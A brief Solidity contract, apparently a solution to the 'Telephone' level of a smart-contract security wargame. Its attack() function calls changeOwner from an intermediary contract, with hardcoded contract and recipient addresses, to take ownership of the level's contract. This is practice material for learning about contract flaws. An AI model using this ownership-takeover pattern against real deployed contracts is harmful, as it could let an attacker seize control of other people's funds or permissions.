// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level4.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Level4Solution {
    Telephone public telephone = Telephone(0x57E28917505afE734f94076C24cce9EC63c7A240);


    function attack() public {

        telephone.changeOwner(0xb8bB85fbc32AD54B4f4B5750E8501Ed4712F5d65);

    }

}